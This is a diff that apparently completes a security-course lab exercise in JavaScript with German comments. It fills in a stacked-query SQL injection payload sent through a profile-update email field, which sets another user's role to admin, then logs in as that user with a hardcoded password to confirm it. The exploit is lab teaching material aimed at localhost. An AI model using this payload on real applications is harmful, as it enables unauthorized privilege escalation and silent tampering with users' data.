@@ -1,5 +1,5 @@
 // =====================================================================
-//  ANGRIFF 2.3 – INTEGRITÄT   ***TODO: von dir zu implementieren***
+//  ANGRIFF 2.3 – INTEGRITÄT
 // =====================================================================
 //  Ziel: Daten verändern, ohne dass die betroffene Person es merkt.
 //
@@ -30,23 +30,31 @@
 const BASE_URL = process.env.TARGET_URL || 'http://127.0.0.1:3000';
 
 async function run() {
-  // TODO: Payload bauen.
-  const username = 'felix';        // dein eigener, unverdächtiger Account
-  const newEmail = '';             // <-- HIER den stacked-query-Payload einsetzen
-
-  if (!newEmail) {
-    console.log('TODO: In dieser Datei fehlt noch der Angriffs-Payload (newEmail).');
-    return;
-  }
+  const username = 'felix';
+  const newEmail =
+    "x@x.ch'; UPDATE users SET role='admin' WHERE username='marco'; -- ";
 
   const res = await fetch(`${BASE_URL}/profile/update`, {
     method: 'POST',
     headers: { 'Content-Type': 'application/json' },
     body: JSON.stringify({ username, newEmail }),
   });
+
   const data = await res.json();
   console.log('Server-Antwort:', data);
-  // TODO: Danach nachweisen, dass marcos Rolle jetzt 'admin' ist.
+
+  const loginRes = await fetch(`${BASE_URL}/login`, {
+    method: 'POST',
+    headers: { 'Content-Type': 'application/json' },
+    body: JSON.stringify({
+      username: 'marco',
+      password: 'passw0rd',
+    }),
+  });
+
+  const loginData = await loginRes.json();
+
+  console.log('Nachweis: Marcos Benutzerdaten:', loginData);
 }
 
 run().catch((err) => {
